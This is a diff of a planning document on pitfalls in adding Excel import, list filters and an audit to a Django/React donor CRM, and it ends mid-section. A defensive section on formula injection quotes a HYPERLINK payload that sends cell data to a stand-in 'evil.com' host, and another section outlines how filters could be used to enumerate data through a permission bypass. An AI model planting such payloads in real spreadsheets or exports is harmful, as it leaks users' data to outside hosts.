@@ -1,1161 +1,764 @@
-# Domain Pitfalls: Pipeline/Stage Tracking with Event Sourcing
+# Domain Pitfalls: Smartsheet Import, List Page Filters & Quality Audit
 
-**Domain:** Fundraising pipeline kanban with event-sourced stages, grid UI, decision tracking
-**Researched:** 2026-01-24
-**Context:** Django/DRF + React, 100+ contacts × 7 columns grid, append-only events, decision current+history
+**Domain:** Adding Excel/CSV import with column mapping, comprehensive list page filters, and quality audit to existing Django/React CRM
+**Researched:** 2026-02-16
+**Confidence:** HIGH (pitfalls verified against actual DonorCRM codebase patterns)
 
 ## Critical Pitfalls
 
-Mistakes that cause rewrites or major issues.
+Mistakes that cause rewrites, security vulnerabilities, or data corruption.
 
-### Pitfall 1: N+1 Queries from Derived Current State
+### Pitfall 1: Smartsheet Excel Dates Arrive as Serial Numbers, Not Date Objects
 
-**What goes wrong:** Computing "current stage" from event history for each contact independently creates N+1 queries. With 100 contacts, this becomes 1 query for contacts + 100 queries for stage events = crushing performance.
+**What goes wrong:**
+Smartsheet exports dates as Excel serial numbers (e.g., `44927` instead of `2023-01-01`). When openpyxl reads these cells with `data_only=True`, some cells return `datetime` objects while others return raw integers depending on cell formatting. The existing `_parse_date()` function in `apps/imports/services.py:73-92` expects string input in formats like `YYYY-MM-DD` or `MM/DD/YYYY` -- it will silently fail on integer serial numbers, returning the error `"Invalid date format: 44927"`. Users see validation errors for every row containing dates.
 
-**Why it happens:** Event sourcing requires replaying events to compute current state. Naive implementation queries events per contact inside a loop or property getter. Django ORM makes this easy to do accidentally with `contact.current_stage` as a property that hits the database.
+**Why it happens:**
+Excel stores dates internally as serial numbers (days since 1900-01-01, with the infamous Lotus 1-2-3 leap year bug for dates before March 1, 1900). Whether openpyxl returns a `datetime` or an `int` depends on whether the cell has a number format applied. Smartsheet exports are inconsistent about cell formatting -- date columns may or may not have format codes applied, especially when the Smartsheet column type was "Text/Number" containing date-like values rather than a native Date column.
 
-**Consequences:**
-- Grid page load times balloon from 200ms to 5+ seconds
-- Database connection pool exhaustion under concurrent users
-- Server timeouts on grids with 200+ contacts
-
-**Prevention:**
+**How to avoid:**
 ```python
-# BAD - N+1 queries
-contacts = Contact.objects.filter(journal=journal)
-for contact in contacts:
-    current_stage = contact.stage_events.latest('created_at').stage  # Query per contact
+# In new parse_smartsheet_file() -- NOT in existing _parse_date()
+from datetime import datetime, timedelta
+from openpyxl.utils.datetime import from_excel
 
-# GOOD - Prefetch with subquery
-from django.db.models import OuterRef, Subquery
+def normalize_cell_value(cell_value, expected_type='text'):
+    """Normalize openpyxl cell values to Python types."""
+    if cell_value is None:
+        return ''
 
-latest_stage_events = StageEvent.objects.filter(
-    contact=OuterRef('pk'),
-    journal=journal
-).order_by('-created_at')
+    if expected_type == 'date':
+        # Already a datetime from openpyxl
+        if isinstance(cell_value, datetime):
+            return cell_value.date()
+        # Excel serial number (int or float)
+        if isinstance(cell_value, (int, float)) and 1 < cell_value < 2958466:
+            return from_excel(cell_value).date()
+        # String date -- delegate to existing _parse_date()
+        if isinstance(cell_value, str):
+            parsed, error = _parse_date(cell_value)
+            return parsed  # May be None if invalid
+        return None
 
-contacts = Contact.objects.filter(journal=journal).annotate(
-    current_stage=Subquery(latest_stage_events.values('stage')[:1])
-).prefetch_related(
-    Prefetch('stage_events', queryset=StageEvent.objects.filter(journal=journal))
+    if expected_type == 'amount':
+        if isinstance(cell_value, (int, float)):
+            return Decimal(str(cell_value))
+        if isinstance(cell_value, str):
+            amount, error = _parse_amount(cell_value)
+            return amount
+        return None
+
+    # Default: convert to string
+    return str(cell_value).strip()
+```
+
+**Warning signs:**
+- Validation errors on date fields that look correct when opened in Excel
+- Test files using hand-typed dates work, but actual Smartsheet exports fail
+- Date columns returning integers in debug output
+- All date rows failing validation simultaneously
+
+**Phase to address:**
+Phase 1 (Excel/CSV parsing backend) -- type normalization layer must sit between openpyxl cell reading and existing validation functions
+
+**Sources:**
+- [openpyxl Dates and Times documentation](https://openpyxl.readthedocs.io/en/stable/datetime.html)
+- [Date and Time Handling | openpyxl DeepWiki](https://deepwiki.com/soxhub/openpyxl/8.1-date-and-time-handling)
+
+---
+
+### Pitfall 2: Merged Cells in Smartsheet Exports Return None for All But Top-Left Cell
+
+**What goes wrong:**
+Smartsheet exports often contain merged header rows (e.g., a "Contact Information" header spanning columns A-E). When openpyxl reads merged cells, only the top-left cell has a value -- all other cells in the merged range return `None`. The header detection logic reads row 1 and gets `['Contact Information', None, None, None, None, 'Giving History', None, None]` instead of individual column names. Column mapping fails because headers are mostly `None`.
+
+**Why it happens:**
+Excel's merge operation stores the value only in the top-left cell. openpyxl faithfully represents this -- it does not "unmerge" or repeat values across the range. Developers test with simple Excel files where row 1 has clean individual headers. Real Smartsheet exports often have multi-level headers with merges.
+
+**How to avoid:**
+```python
+from openpyxl import load_workbook
+
+def extract_headers(workbook, sheet_name=None):
+    """Extract headers, handling merged cells by skipping to first non-merged row."""
+    ws = workbook.active if sheet_name is None else workbook[sheet_name]
+
+    # Check for merged cells in first few rows
+    merged_ranges = ws.merged_cells.ranges
+
+    # Find first row where no cells are merged
+    for row_idx in range(1, min(6, ws.max_row + 1)):  # Check first 5 rows
+        row_values = [cell.value for cell in ws[row_idx]]
+
+        # Skip rows that are entirely or mostly None (likely merged header rows)
+        non_none_count = sum(1 for v in row_values if v is not None)
+        if non_none_count >= len(row_values) * 0.5:  # At least 50% non-None
+            return row_values, row_idx
+
+    # Fallback: first row
+    return [cell.value for cell in ws[1]], 1
+```
+
+**Warning signs:**
+- Headers list contains mostly `None` values
+- Column mapping auto-detection returns 0 matches
+- Works with "clean" Excel files but fails with real Smartsheet exports
+- Users reporting "file has no headers" when headers are clearly visible in Excel
+
+**Phase to address:**
+Phase 1 (Excel/CSV parsing backend) -- header extraction must handle merged cells before column mapping UI is built
+
+**Sources:**
+- [openpyxl: dealing with merged cells](https://gist.github.com/tchen/01d1d61a985190ff6b71fc14c45f95c9)
+- [How to work with merged cells in Excel with openpyxl](https://medium.com/@shizidushu/how-to-work-with-merged-cells-in-excel-with-openpy-in-python-89f32822a11f)
+
+---
+
+### Pitfall 3: Breaking Existing CSV Import by Modifying Shared Service Functions
+
+**What goes wrong:**
+New Smartsheet import feature shares validation logic with existing CSV import. Developer modifies `_parse_amount()` (services.py:47-70) to handle Excel numeric types (which arrive as `float` or `Decimal` from openpyxl, not strings). The modification changes the `amount_str.strip()` call to accept non-string types -- but now the existing CSV import path passes in string values that follow a different code path, and edge cases (like `"$1,234.56"` with dollar sign and comma) that previously worked now break because the shared function's contract changed.
+
+**Why it happens:**
+The existing services.py has 4 parsers (`parse_contacts_csv`, `parse_donations_csv`, `parse_funds_csv`, `parse_transactions_csv`, `parse_pledges_csv`) that all share `_parse_amount()`, `_parse_date()`, and `_validate_email()`. These helpers assume string input from `csv.DictReader`. Modifying them to also accept openpyxl types (int, float, datetime) introduces dual-type logic that can subtly break the string path.
+
+**How to avoid:**
+1. DO NOT modify `_parse_amount()`, `_parse_date()`, or `_validate_email()` in services.py
+2. Create a NEW `smartsheet_services.py` file with a `normalize_cell_value()` layer that converts openpyxl types to strings BEFORE calling existing validators
+3. Keep existing CSV import code paths completely unchanged
+4. Run ALL existing import tests after any shared code changes
+
+```python
+# NEW FILE: apps/imports/smartsheet_services.py
+from apps.imports.services import (
+    _parse_amount, _parse_date, _validate_email,
+    FORMULA_PREFIXES, parse_contacts_csv
 )
+
+def normalize_row_to_strings(row_values: list, headers: list) -> dict:
+    """Convert openpyxl cell values to strings matching CSV format."""
+    result = {}
+    for header, value in zip(headers, row_values):
+        if value is None:
+            result[header] = ''
+        elif isinstance(value, datetime):
+            result[header] = value.strftime('%Y-%m-%d')
+        elif isinstance(value, (int, float, Decimal)):
+            result[header] = str(value)
+        else:
+            result[header] = str(value).strip()
+    return result
 ```
 
-**Detection:**
-- Django Debug Toolbar showing >50 queries for a single grid page
-- `django.db.connection.queries` list growing linearly with contact count
-- Slow query logs showing repeated similar SELECT statements
+**Warning signs:**
+- Renaming or changing signatures of `_parse_amount`, `_parse_date`, or `_validate_email`
+- Adding `isinstance()` checks to existing helper functions
+- Existing CSV import tests still pass but manual testing fails with edge cases
+- Test files used for CSV import are simple (no dollar signs, no commas in amounts)
 
-**Phase:** Phase 1 (Data Model + Basic Grid) — must design queries correctly from start
-
-**Sources:**
-- [Django select_related and prefetch_related](https://betterprogramming.pub/django-select-related-and-prefetch-related-f23043fd635d)
-- [Optimizing Django Queries](https://medium.com/django-unleashed/optimizing-django-queries-with-select-related-and-prefetch-related-e404af72e0eb)
+**Phase to address:**
+Phase 1 (Excel/CSV parsing backend) -- establish file isolation before writing any Excel parsing code. Run full regression suite: `test_fund_import.py`, `test_entity_import.py`, `test_transaction_import.py`, `test_pledge_import.py`
 
 ---
 
-### Pitfall 2: Atomic Transaction Scope Confusion for Multi-Model Writes
+### Pitfall 4: CSV/Formula Injection on Import -- Existing Defense Only Covers fund_id and name Fields
 
-**What goes wrong:** Decision updates must atomically write to Decision (current), DecisionHistory, and StageEvent. Using `transaction.atomic()` incorrectly leads to partial writes where DecisionHistory saves but StageEvent fails, leaving inconsistent state.
+**What goes wrong:**
+The existing import pipeline has formula injection prevention for `fund_id` and `name` fields in `parse_funds_csv()` (services.py:521-522) and `parse_entities_csv()` (services.py:682-695), but `parse_contacts_csv()` and `parse_donations_csv()` have NO formula prefix checking. A user imports a Smartsheet CSV where a contact's `first_name` is `=HYPERLINK("http://evil.com?d="&A1,"Click")`. This value passes validation, gets stored in the database, and later appears in exported CSV files where it executes when opened in Excel.
 
-**Why it happens:** Django's `transaction.atomic()` doesn't roll back model instance state in memory, only database writes. Developers assume atomic blocks guarantee consistency but don't handle exceptions properly or use nested atomics incorrectly.
+**Why it happens:**
+Formula injection prevention was added per-parser during SPO import development, and only the parsers that handle external system IDs (funds, entities) got it. The contact and donation parsers were written earlier and never updated. The new Smartsheet parser must not repeat this gap.
 
-**Consequences:**
-- Decision shows "Committed $100/month" but no corresponding stage event exists
-- Decision history table has orphaned records after failed saves
-- User sees success message but data is incomplete
-- Debugging requires manual SQL to find inconsistencies
-
-**Prevention:**
+**How to avoid:**
 ```python
-# BAD - No transaction boundary
-def update_decision(contact, journal, amount, cadence):
-    decision = Decision.objects.get(contact=contact, journal=journal)
-    decision.amount = amount
-    decision.cadence = cadence
-    decision.save()  # If this succeeds but next fails, partial write
+# Add to ALL text field validation in new Smartsheet parser
+def sanitize_text_field(value: str, field_name: str) -> tuple[str, str | None]:
+    """Sanitize text field, rejecting formula injection attempts."""
+    if not value:
+        return value, None
+    if value.startswith(FORMULA_PREFIXES):
+        return None, f'{field_name} cannot start with formula character ({value[0]})'
+    return value, None
 
-    DecisionHistory.objects.create(
-        decision=decision,
-        amount=amount,
-        cadence=cadence
-    )
-
-    StageEvent.objects.create(
-        contact=contact,
-        journal=journal,
-        stage='DECISION',
-        event_type='decision_updated'
-    )  # If this fails, decision saved but no event
-
-# GOOD - Atomic with proper exception handling
-from django.db import transaction
-
-@transaction.atomic
-def update_decision(contact, journal, amount, cadence):
-    # All-or-nothing: if any save() fails, entire transaction rolls back
-    decision = Decision.objects.select_for_update().get(
-        contact=contact,
-        journal=journal
-    )
-    decision.amount = amount
-    decision.cadence = cadence
-    decision.save()
-
-    DecisionHistory.objects.create(
-        decision=decision,
-        amount=amount,
-        cadence=cadence,
-        changed_at=timezone.now()
-    )
-
-    StageEvent.objects.create(
-        contact=contact,
-        journal=journal,
-        stage='DECISION',
-        event_type='decision_updated',
-        metadata={'amount': amount, 'cadence': cadence}
-    )
-    # Transaction commits only if all three succeed
+# Apply to every user-provided text field during import
+for field in ['first_name', 'last_name', 'email', 'phone', 'notes',
+              'street_address', 'city', 'state']:
+    value = row.get(field, '').strip()
+    sanitized, error = sanitize_text_field(value, field)
+    if error:
+        row_errors.append(error)
 ```
 
-**Detection:**
-- Count mismatches: `Decision.objects.count()` != `DecisionHistory.objects.count()`
-- Missing stage events for decision changes in audit log
-- IntegrityError logs showing constraint violations mid-transaction
+**Warning signs:**
+- New Smartsheet parser copies validation from `parse_contacts_csv()` (which lacks formula checks)
+- No security test cases with formula payloads in test suite
+- Only testing "happy path" import data
 
-**Phase:** Phase 2 (Decision Tracking) — design transaction boundaries before implementing updates
-
-**Caveat:** Never catch exceptions inside `@transaction.atomic` block without re-raising. Django won't rollback if you swallow the exception.
+**Phase to address:**
+Phase 1 (Excel/CSV parsing backend) -- formula injection prevention must be part of ALL new parsing code. Also backfill `parse_contacts_csv()` and `parse_donations_csv()` as tech debt fix.
 
 **Sources:**
-- [Django's transaction.atomic()](https://charemza.name/blog/posts/django/postgres/transactions/not-as-atomic-as-you-may-think/)
-- [The trouble with transaction.atomic](https://seddonym.me/2020/11/19/trouble-atomic/)
-- [Django atomic transactions](https://medium.com/@shivanikakrecha/transaction-atomic-in-django-87b787ead793)
+- [CSV Injection | OWASP Foundation](https://owasp.org/www-community/attacks/CSV_Injection)
 
 ---
 
-### Pitfall 3: Event Replay Performance Without Snapshots
+### Pitfall 5: Permission Bypass When Adding Filters to List Views (KNOWN BUG -- Must Fix BEFORE Filters)
 
-**What goes wrong:** Replaying 1000+ events to compute "current stage" for a contact takes 500ms+. Multiply by 100 contacts and grid page becomes unusable. Event sourcing systems without snapshot strategy don't scale past small datasets.
+**What goes wrong:**
+The codebase has a known permission bypass documented in EDGE_CASE_AUDIT.md (section 2.2/4.1): `ContactDonationsView` and `ContactPledgesView` use `IsContactOwnerOrReadAccess` which only implements `has_object_permission()`. DRF's `ListAPIView` never calls `get_object()`, so the permission is never evaluated. Adding DjangoFilterBackend filters to these views (e.g., `?owner=<other_user_id>`) makes exploitation trivially easy -- before filters, an attacker needed to know a contact UUID; with filters, they can enumerate data with `?owner=1&owner=2&...`.
 
-**Why it happens:** Pure event sourcing design says "replay all events to get current state." Works great with 10 events per contact. Breaks down with active contacts accumulating hundreds of stage transitions over months.
+**Why it happens:**
+The filter implementation task looks separate from the security fix. Developer adds `DjangoFilterBackend` with `filterset_fields = ['owner']` to `ContactListCreateView` without realizing that `get_queryset()` already handles owner-scoping manually (views.py:55-68) but the nested views (`ContactDonationsView`, `ContactPledgesView`) do not. Adding filters to the parent view is safe; extending the pattern to nested views is not.
 
-**Consequences:**
-- Grid rendering hangs browser for 10+ seconds
-- Database CPU spikes as replay queries execute
-- Older journals become slower than recent ones (more events accumulated)
-- Report generation times out
-
-**Prevention:**
+**How to avoid:**
+1. Fix the permission bypass BEFORE adding any filters -- this is a prerequisite, not a parallel task
+2. Override `get_queryset()` in ALL list views to scope by owner:
 ```python
-# Strategy 1: Denormalize current state (recommended for this use case)
-class JournalContact(models.Model):
-    """Through table for Contact-Journal relationship"""
-    contact = models.ForeignKey(Contact, on_delete=models.CASCADE)
-    journal = models.ForeignKey(Journal, on_delete=models.CASCADE)
+class ContactDonationsView(generics.ListAPIView):
+    def get_queryset(self):
+        contact_id = self.kwargs.get('pk')
+        user = self.request.user
 
-    # Denormalized current state - updated on every stage event
-    current_stage = models.CharField(max_length=50, default='CONTACT')
-    last_stage_change = models.DateTimeField(auto_now_add=True)
+        # Scope by owner FIRST, then apply contact filter
+        if user.role in ['admin', 'finance', 'read_only']:
+            return Donation.objects.filter(contact_id=contact_id).order_by('-date')
+        else:
+            return Donation.objects.filter(
+                contact_id=contact_id,
+                contact__owner=user  # Owner scoping
+            ).order_by('-date')
+```
+3. NEVER add `owner` or `uploaded_by` to filterset_fields for non-admin users
+4. Add security test: regular user attempts `GET /api/v1/contacts/{other_user_contact}/donations/` and gets empty result or 404
 
-    class Meta:
-        unique_together = [['contact', 'journal']]
+**Warning signs:**
+- Adding filters without first checking which views have the permission bypass
+- `filterset_fields` includes `owner` without role-based exclusion
+- No security-focused tests for cross-user data access
 
-# Update current_stage whenever StageEvent is created
-@receiver(post_save, sender=StageEvent)
-def update_current_stage(sender, instance, created, **kwargs):
-    if created:
-        JournalContact.objects.filter(
-            contact=instance.contact,
-            journal=instance.journal
-        ).update(
-            current_stage=instance.stage,
-            last_stage_change=instance.created_at
+**Phase to address:**
+Phase 1 (Security prerequisite) -- fix BEFORE Phase 3 (filtering backend). The EDGE_CASE_AUDIT.md ranks this #2 in the top 10 risk list.
+
+**Sources:**
+- [DRF Filtering documentation](https://www.django-rest-framework.org/api-guide/filtering/) -- "ensure that any unpermitted objects will not be included in the returned results"
+- [DRF Permissions documentation](https://www.django-rest-framework.org/api-guide/permissions/) -- "Object level permissions are only checked with views that call get_object()"
+- EDGE_CASE_AUDIT.md sections 2.2 and 4.1
+
+---
+
+### Pitfall 6: Filter Query Performance on Contacts with M2M Group Join
+
+**What goes wrong:**
+Adding a `group` filter to ContactList already exists manually (views.py:71-73: `queryset.filter(groups__id=group_id)`), but adding it as a DjangoFilterBackend filterset field creates duplicate filtering. More critically: the Contact model has `groups = ManyToManyField('groups.Group')` and filtering on M2M relationships without `distinct()` returns duplicate rows. User sees the same contact appearing 3 times because they belong to 3 groups.
+
+The broader performance issue: adding `owner`, `created_at__gte`, `created_at__lte`, `last_gift_date__gte`, `last_gift_date__lte`, and `group` filters to a queryset that already has `select_related('owner')` produces a multi-join SQL query. On 5,000+ contacts, the query plan degrades from index scan to sequential scan if the combined filter cardinality is unfavorable.
+
+**Why it happens:**
+Django M2M filter silently creates a JOIN that can produce duplicates. The existing manual `filter(groups__id=group_id)` works because it is only one join, but combining it with DjangoFilterBackend's filter creates the same join twice. Developers don't notice duplicates with small test datasets.
+
+**How to avoid:**
+```python
+class ContactListCreateView(generics.ListCreateAPIView):
+    filterset_fields = {
+        'status': ['exact'],
+        'needs_thank_you': ['exact'],
+        # Do NOT add 'groups' to filterset_fields -- use custom FilterSet
+    }
+
+    def get_queryset(self):
+        user = self.request.user
+        if user.role in ['admin', 'finance', 'read_only']:
+            queryset = Contact.objects.all()
+        else:
+            queryset = Contact.objects.filter(owner=user)
+
+        # Manual group filter with distinct()
+        group_id = self.request.query_params.get('group')
+        if group_id:
+            queryset = queryset.filter(groups__id=group_id).distinct()
+
+        # Owner filter (admin only)
+        owner_id = self.request.query_params.get('owner')
+        if owner_id and user.role == 'admin':
+            queryset = queryset.filter(owner_id=owner_id)
+
+        return queryset.select_related('owner')
+```
+
+Also: verify database indexes cover the combined filter pattern:
+```python
+class Meta:
+    indexes = [
+        models.Index(fields=['owner', 'status']),           # Existing
+        models.Index(fields=['owner', 'last_gift_date']),    # Existing
+        models.Index(fields=['status', 'needs_thank_you']),  # NEW for filter combo
+    ]
+```
+
+**Warning signs:**
+- Duplicate contacts appearing in filtered results
+- Query counts increasing unexpectedly when combining multiple filters
+- `EXPLAIN ANALYZE` showing sequential scan on contacts table
+- Page load time doubling when 3+ filters are active simultaneously
+
+**Phase to address:**
+Phase 3 (Filtering backend) -- test every filter combination with 1000+ contacts, check for duplicates and query performance
+
+**Sources:**
+- [django-filter Performance Issues #1264](https://github.com/carltongibson/django-filter/issues/1264)
+- [Django and the N+1 Queries Problem](https://www.scoutapm.com/blog/django-and-the-n1-queries-problem)
+- [10 Tips to Optimize PostgreSQL Queries in Django](https://blog.gitguardian.com/10-tips-to-optimize-postgresql-queries-in-your-django-project/)
+
+---
+
+### Pitfall 7: Memory Exhaustion from Large Excel File Upload (Existing Pattern Amplified)
+
+**What goes wrong:**
+The existing CSV import reads entire files into memory: `content = file.read().decode('utf-8')` (views.py:78). This pattern is duplicated for Excel files, but Excel files are 3-10x larger than equivalent CSV files due to XML structure inside .xlsx. A 5MB CSV file might produce a 25MB .xlsx equivalent. openpyxl's default mode loads the entire workbook object model into memory, consuming 5-10x the file size in RAM. A 10MB Excel file can consume 100MB of Python process memory.
+
+The app runs on Render free tier (512MB RAM). A single 10MB upload could exhaust available memory and crash the process.
+
+**Why it happens:**
+The existing import pattern (`file.read().decode('utf-8')`) works for CSV because CSV files are compact text. Developers extend this pattern to Excel without realizing openpyxl's memory characteristics. Additionally, there is no `FILE_UPLOAD_MAX_MEMORY_SIZE` or `DATA_UPLOAD_MAX_MEMORY_SIZE` configured in Django settings (documented in EDGE_CASE_AUDIT.md section 6.1).
+
+**How to avoid:**
+```python
+# In new SmartsheetImportView
+MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
+
+def post(self, request):
+    file = request.FILES.get('file')
+    if not file:
+        return Response({'detail': 'No file provided.'}, status=400)
+
+    # Check file size BEFORE reading
+    if file.size > MAX_FILE_SIZE:
+        return Response(
+            {'detail': f'File too large ({file.size // 1024 // 1024}MB). Maximum is 10MB.'},
+            status=400
         )
 
-# Strategy 2: Periodic snapshots (if pure event sourcing required)
-class StageSnapshot(models.Model):
-    contact = models.ForeignKey(Contact, on_delete=models.CASCADE)
-    journal = models.ForeignKey(Journal, on_delete=models.CASCADE)
-    current_stage = models.CharField(max_length=50)
-    snapshot_at = models.DateTimeField(auto_now_add=True)
-    event_count = models.IntegerField()  # How many events replayed to create this
-
-# Create snapshot every 100 events or weekly
-def get_current_stage(contact, journal):
-    latest_snapshot = StageSnapshot.objects.filter(
-        contact=contact, journal=journal
-    ).order_by('-snapshot_at').first()
-
-    if latest_snapshot:
-        # Replay only events after snapshot
-        events = StageEvent.objects.filter(
-            contact=contact,
-            journal=journal,
-            created_at__gt=latest_snapshot.snapshot_at
-        ).order_by('created_at')
+    # For Excel: use read_only mode to stream rows
+    if file.name.endswith(('.xlsx', '.xlsm')):
+        wb = load_workbook(
+            filename=file,           # Pass file object directly, not .read()
+            read_only=True,          # Stream mode -- constant memory
+            data_only=True           # Values not formulas
+        )
+        ws = wb.active
+        headers = [cell.value for cell in next(ws.iter_rows(min_row=1, max_row=1))]
+        # Preview: only read first 5 data rows
+        preview_rows = []
+        for i, row in enumerate(ws.iter_rows(min_row=2, max_row=6)):
+            preview_rows.append([cell.value for cell in row])
+        wb.close()  # CRITICAL: close workbook to release memory in read_only mode
     else:
-        # No snapshot, replay all events
-        events = StageEvent.objects.filter(
-            contact=contact,
-            journal=journal
-        ).order_by('created_at')
-
-    current_stage = latest_snapshot.current_stage if latest_snapshot else 'CONTACT'
-    for event in events:
-        current_stage = event.stage  # Simplified - actual replay logic here
-
-    return current_stage
+        # CSV: existing pattern (acceptable for text files)
+        content = file.read().decode('utf-8-sig')
 ```
 
-**Detection:**
-- `select * from stage_events` queries taking >100ms
-- Grid component shows loading spinner for >2 seconds
-- Browser profiler shows JavaScript replay loops consuming CPU
+Also add to Django settings:
+```python
+# settings/base.py
+DATA_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024  # 10MB
+FILE_UPLOAD_MAX_MEMORY_SIZE = 10 * 1024 * 1024   # 10MB
+```
 
-**Phase:** Phase 1 (Data Model) — choose denormalization vs snapshot strategy before writing event models
+**Warning signs:**
+- No file size check before `file.read()`
+- Using `load_workbook()` without `read_only=True`
+- Not calling `wb.close()` after processing in read_only mode (leaks file handles)
+- Testing only with small files (<100KB)
 
-**Recommendation:** Denormalize current_stage in JournalContact through table. Event log remains append-only for audit, but current state is O(1) lookup. Snapshots add complexity without benefit for this scale (100s of contacts, not millions).
+**Phase to address:**
+Phase 1 (Excel/CSV parsing backend) -- file size limits and read_only mode are architectural decisions that must be made upfront
 
 **Sources:**
-- [Snapshot Strategies: Optimizing Event Replays](https://dev.to/alex_aslam/snapshot-strategies-optimizing-event-replays-36oo)
-- [Optimizing Event Replays](https://docs.eventsourcingdb.io/best-practices/optimizing-event-replays/)
-- [The Performance Factor in Event Sourcing](https://patchlevel.de/blog/the-performance-factor-in-event-sourcing)
+- [Handling Large File Uploads in Django](https://medium.com/@ewho.ruth2014/handling-large-file-uploads-in-django-e86da6bde982)
+- [openpyxl read_only mode](https://openpyxl.readthedocs.io/en/stable/usage.html)
+- EDGE_CASE_AUDIT.md section 6.1
 
 ---
 
-### Pitfall 4: React Grid Cell Re-render Cascade
+### Pitfall 8: Filter State Desynchronization Between URL and UI Components
 
-**What goes wrong:** Updating one cell (e.g., marking stage complete) triggers re-render of entire 100-row grid because cell components take entire row object as prop. Browser freezes for 2-3 seconds on every interaction.
+**What goes wrong:**
+The existing ContactList.tsx and DonationList.tsx use `useSearchParams()` for filter state (good pattern). But there is a subtle bug: `searchInput` is stored in `useState` (ContactList.tsx:65) separately from the URL param `search`. On initial page load from a bookmarked URL like `/contacts?search=smith`, the search INPUT shows "smith" (initialized from searchParams). But if the user clicks a status filter dropdown, `handleStatusFilter` creates a new `URLSearchParams(searchParams)` which preserves the search param. So far so good.
 
-**Why it happens:** Cell components receive `rowData` prop containing all contact fields. When any field changes (even unrelated to this cell), React sees prop changed and re-renders. Multiply by 100 contacts × 7 columns = 700 cell re-renders for a single stage update.
+The pitfall appears when adding NEW filters (owner, date range, group) to existing pages: developers must replicate this synchronized pattern for EVERY new filter. If one filter uses `useState` without initializing from searchParams, bookmarks break for that filter. If one filter handler creates `new URLSearchParams()` (empty) instead of `new URLSearchParams(searchParams)` (preserving existing), it wipes other active filters.
 
-**Consequences:**
-- UI feels sluggish on every click
-- Optimistic updates lag 2-3 seconds before showing
-- Mobile devices become unusable (lower CPU)
-- User abandons feature thinking it's broken
+**Why it happens:**
+The existing pattern works but is fragile -- each filter handler independently creates `new URLSearchParams(searchParams)` and manually sets/deletes its own param. Adding 5 more filters means 5 more handler functions that must all follow the same pattern. One mistake in one handler breaks the whole filter experience.
 
-**Prevention:**
+**How to avoid:**
+Extract a shared filter hook that manages all filter state through URL params:
 ```typescript
-// BAD - Cell component receives entire row object
-interface StageCellProps {
-  rowData: Contact;  // If ANY field on contact changes, cell re-renders
-  stage: string;
+// hooks/useFilterParams.ts
+export function useFilterParams<T extends Record<string, string | undefined>>(
+  defaults: T
+) {
+  const [searchParams, setSearchParams] = useSearchParams()
+
+  const filters = useMemo(() => {
+    const result = { ...defaults }
+    for (const key of Object.keys(defaults)) {
+      result[key as keyof T] = (searchParams.get(key) || defaults[key]) as any
+    }
+    return result
+  }, [searchParams, defaults])
+
+  const setFilter = useCallback((key: keyof T, value: string | undefined) => {
+    const params = new URLSearchParams(searchParams)  // Preserve ALL params
+    if (value) {
+      params.set(key as string, value)
+    } else {
+      params.delete(key as string)
+    }
+    params.set('page', '1')  // Reset pagination
+    setSearchParams(params)
+  }, [searchParams, setSearchParams])
+
+  const clearFilters = useCallback(() => {
+    setSearchParams({})
+  }, [setSearchParams])
+
+  return { filters, setFilter, clearFilters }
 }
 
-const StageCell: React.FC<StageCellProps> = ({ rowData, stage }) => {
-  // This re-renders even if only rowData.email changed
-  return <div>{rowData.stages[stage]?.completed ? '✓' : ''}</div>;
-};
-
-// GOOD - Cell receives only data it needs, wrapped in React.memo
-interface StageCellProps {
-  contactId: string;
-  stageCompleted: boolean;
-  stageTimestamp: string | null;
-  onToggle: (contactId: string, stage: string) => void;
-  stage: string;
-}
-
-const StageCell: React.FC<StageCellProps> = React.memo(({
-  contactId,
-  stageCompleted,
-  stageTimestamp,
-  onToggle,
-  stage
-}) => {
-  // Only re-renders when stageCompleted or stageTimestamp changes
-  return (
-    <div onClick={() => onToggle(contactId, stage)}>
-      {stageCompleted ? '✓' : ''}
-      {stageTimestamp && <span className="text-xs">{formatDate(stageTimestamp)}</span>}
-    </div>
-  );
-}, (prevProps, nextProps) => {
-  // Custom comparison: only re-render if stage-specific props changed
-  return (
-    prevProps.stageCompleted === nextProps.stageCompleted &&
-    prevProps.stageTimestamp === nextProps.stageTimestamp
-  );
-});
-
-// Memoize callback to prevent new function reference on parent re-render
-const handleToggleStage = useCallback((contactId: string, stage: string) => {
-  updateStageMutation.mutate({ contactId, stage });
-}, [updateStageMutation]);
-
-// Memoize data transformation
-const gridData = useMemo(() => {
-  return contacts.map(contact => ({
-    contactId: contact.id,
-    name: contact.name,
-    stages: stages.reduce((acc, stage) => ({
-      ...acc,
-      [stage.name]: {
-        completed: contact.currentStage === stage.name,
-        timestamp: contact.stageEvents.find(e => e.stage === stage.name)?.createdAt
-      }
-    }), {})
-  }));
-}, [contacts]);
+// Usage in ContactList.tsx
+const { filters, setFilter, clearFilters } = useFilterParams({
+  search: undefined,
+  status: undefined,
+  owner: undefined,
+  group: undefined,
+  needs_thank_you: undefined,
+})
 ```
 
-**Detection:**
-- React DevTools Profiler showing >500ms render time for grid component
-- Chrome Performance tab showing long JavaScript tasks during grid interaction
-- Console.log in cell component firing 700 times for single update
+**Warning signs:**
+- Each filter has its own `handleXxxFilter` function that creates `new URLSearchParams`
+- Filter state uses `useState` without initializing from URL params
+- Bookmarking a filtered URL does not restore all active filters
+- Clicking one filter clears other active filters
+- No "Clear All Filters" button
 
-**Phase:** Phase 3 (Grid UI) — implement memoization from start, refactoring later is painful
+**Phase to address:**
+Phase 4 (Filtering frontend UI) -- extract shared hook BEFORE adding new filters to avoid copy-paste errors
 
 **Sources:**
-- [React Data Grid Performance](https://mui.com/x/react-data-grid/performance/)
-- [Advanced Performance Patterns for React Data Grids](https://medium.com/@sapnakul/advanced-performance-patterns-for-react-data-grids-real-world-lessons-generic-solutions-4498e3594581)
-- [Memoization Guide - Material React Table](https://www.material-react-table.com/docs/guides/memoization)
+- [Why URL state matters: useSearchParams in React](https://blog.logrocket.com/url-state-usesearchparams/)
+- [Advanced React state management using URL parameters](https://blog.logrocket.com/advanced-react-state-management-using-url-parameters/)
 
 ---
 
-### Pitfall 5: Checkmark Lies (Stale Data Masquerading as Current)
+### Pitfall 9: Dark Mode Audit Finds Hard-Coded Colors in Existing Components
 
-**What goes wrong:** Grid shows checkmark for "Meeting Complete" but event happened 3 months ago. Contact has since ghosted. Checkmark implies freshness/completion when activity is actually stale. Missionary wastes time on cold leads thinking they're active.
+**What goes wrong:**
